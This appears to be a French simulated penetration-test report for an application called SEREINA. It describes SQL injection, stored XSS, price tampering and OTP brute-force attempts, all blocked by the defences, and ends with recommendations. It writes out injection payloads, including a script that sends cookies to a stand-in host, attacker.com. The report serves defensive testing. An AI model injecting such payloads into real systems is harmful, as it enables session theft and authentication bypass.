# Simulation de Tests d'Intrusion (Pentest) - SEREINA

## 1. Périmètre du Test

- **Cible :** API de production et Interface Client.
- **Méthodologie :** Boîte Noire (Black Box) et Boîte Grise (Grey Box).
- **Date de simulation :** 13 Juin 2026.

## 2. Scénarios d'Attaque et Résultats

### Scénario A : Injection SQL sur le Point de Terminaison `/api/v1/auth/login`

- **Vecteur :** Injection de `' OR 1=1 --` dans le champ email.
- **Action :** Tentative de contournement de l'authentification.
- **Résultat :** **ÉCHEC (Défense Opérationnelle)**.
- **Observation :** L'API a renvoyé une erreur 401. Les logs montrent que la requête a été traitée comme une chaîne de caractères littérale par l'ORM, empêchant toute altération de la logique SQL.

### Scénario B : XSS Stocké via le Profil Utilisateur

- **Vecteur :** Insertion de `<script>fetch('https://attacker.com?c='+document.cookie)</script>` dans le champ "Adresse de livraison".
- **Action :** Tentative de vol de session lors de la consultation par un administrateur.
- **Résultat :** **ÉCHEC (Défense Opérationnelle)**.
- **Observation :** Le script a été neutralisé par le moteur de rendu React (échappement automatique) et bloqué par la Content Security Policy (CSP) qui interdit les connexions vers des domaines non autorisés.

### Scénario C : Manipulation de Prix (Insecure Direct Object Reference - IDOR)

- **Vecteur :** Modification de l'ID de commande et du montant dans la requête POST `/api/v1/orders`.
- **Action :** Tenter de payer 1.00€ pour un article à 500.00€.
- **Résultat :** **ÉCHEC (Défense Opérationnelle)**.
- **Observation :** Le backend recalcule systématiquement le prix total à partir de la base de données de référence avant de générer le `PaymentIntent` Stripe. La valeur envoyée par le client est ignorée.

### Scénario D : Attaque par Force Brute sur l'OTP

- **Vecteur :** Script automatisé testant 10 000 combinaisons de codes de vérification par minute.
- **Action :** Compromission du second facteur d'authentification.
- **Résultat :** **ÉCHEC (Défense Opérationnelle)**.
- **Observation :** Le mécanisme de `Rate Limiting` (Redis-based) a banni l'adresse IP source après 5 tentatives infructueuses en moins de 2 minutes.

## 3. Tableau Récapitulatif des Défenses

| Menace          | Technique de Test              | Résultat | Mécanisme de Défense                 |
| :-------------- | :----------------------------- | :------- | :----------------------------------- |
| **SQLi**        | Payload `' OR '1'='1`          | Bloqué   | Prisma ORM / Prepared Statements     |
| **XSS**         | `<img src=x onerror=alert(1)>` | Bloqué   | React Sanitization / CSP             |
| **CSRF**        | Formulaire auto-soumis         | Bloqué   | SameSite Cookies / Origin Validation |
| **Brute Force** | Dictionnaire de mots de passe  | Bloqué   | Rate Limiter (Express-rate-limit)    |
| **Broken Auth** | Manipulation de JWT            | Bloqué   | Signature HS256 avec Secret Fort     |

## 4. Recommandations Post-Test

Bien que les défenses actuelles soient efficaces, il est recommandé de :

1. Mettre en place un système de détection d'intrusion (IDS) pour alerter en temps réel sur les pics de tentatives 401/403.
2. Effectuer une rotation trimestrielle des clés secrètes de signature des tokens JWT.
3. Implémenter le `Certificate Pinning` sur les applications mobiles (si applicable) pour renforcer la sécurité TLS.

**Verdict Final :** Le système a résisté à toutes les simulations d'attaques critiques. La protection des données clients est assurée.
